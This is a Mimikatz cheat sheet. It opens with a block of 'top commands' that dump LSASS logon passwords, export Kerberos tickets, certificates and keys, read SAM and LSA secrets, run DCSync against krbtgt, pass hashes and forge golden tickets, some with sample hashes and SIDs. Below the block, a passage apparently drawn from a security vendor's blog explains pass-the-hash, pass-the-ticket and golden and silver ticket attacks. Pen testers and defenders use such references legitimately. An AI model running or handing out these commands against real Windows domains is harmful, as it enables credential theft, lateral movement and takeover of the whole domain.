--- ---

<h2>Top Commands</h2>
```Terminal
#general
privilege::debug
log
log customlogfilename.log

#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```



---

<h2>What is Mimikatz?</h2>

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is an open-source application that allows users to view and save authentication credentials such as [Kerberos tickets](https://www.varonis.com/blog/kerberos-authentication-explained/?hsLang=en). The toolset works with the current release of Windows and includes a collection of different network attacks to help assess vulnerabilities.

Attackers commonly use Mimikatz to steal credentials and escalate privileges because in most cases, endpoint protection software and antivirus systems will not detect or delete the attack. Conversely, [pen testers](https://www.varonis.com/blog/master-fileless-malware-penetration-testing/?hsLang=en) use Mimikatz to detect and exploit vulnerabilities in your networks so you can fix them.

## What can Mimikatz do?

![what-can-mimikatz-do-2x-png](https://info.varonis.com/hs-fs/hubfs/what-can-mimikatz-do-2x-png.png?width=1600&name=what-can-mimikatz-do-2x-png.png)

Mimikatz originally demonstrated how to exploit a single vulnerability in the Windows authentication system. Now it exposes several different kinds of vulnerabilities; Mimikatz can perform credential-gathering techniques such as:

-   **Pass-the-hash**: Windows used to [store password data in an NTLM hash](https://www.varonis.com/blog/windows-10-authentication-the-end-of-pass-the-hash/?hsLang=en). Attackers use Mimikatz to pass that exact hash string to the target computer to log in. Attackers don’t even need to crack the password — they just need to use the hash string as-is. It’s the equivalent of finding the master key to a building on the lobby floor. You need just that one key to get into all the doors.
-   **Pass-the-ticket**: Newer versions of Windows store password data in a construct called a ticket. Mimikatz provides functionality for a user to pass a Kerberos ticket to another computer and log in with that user’s ticket. It’s very similar to the pass-the-hash method.
-   **Overpass-the-hash (pass-the-key)**: Yet another flavor of the pass-the-hash, but this technique passes a unique key obtained from a domain controller to impersonate a user.
-   **Kerberoast golden tickets**: This is a pass-the-ticket attack, but it’s a specific ticket for a hidden account called KRBTGT, which is the account that encrypts all of the other tickets. A [golden ticket](https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/?hsLang=en) provides you with non-expiring domain admin credentials to any computer on the network.
-   **Kerberoast silver tickets**: Another pass-the-ticket, but a [silver ticket](https://www.varonis.com/blog/kerberos-attack-silver-ticket/?hsLang=en) takes advantage of a feature in Windows that makes it easy for you to use services on the network. Kerberos grants a user a ticket-granting server (TGS) ticket, and a user can use that ticket to authentic to service accounts on the network. Microsoft doesn’t always check a TGS after it’s issued, so it’s easy to slip past any safeguards.
-   **Pass-the-cache**: Finally an attack that doesn’t take advantage of Windows! A pass-the-cache attack is generally the same as a pass-the-ticket, but this one uses the saved and encrypted login data on a Mac/UNIX/Linux system.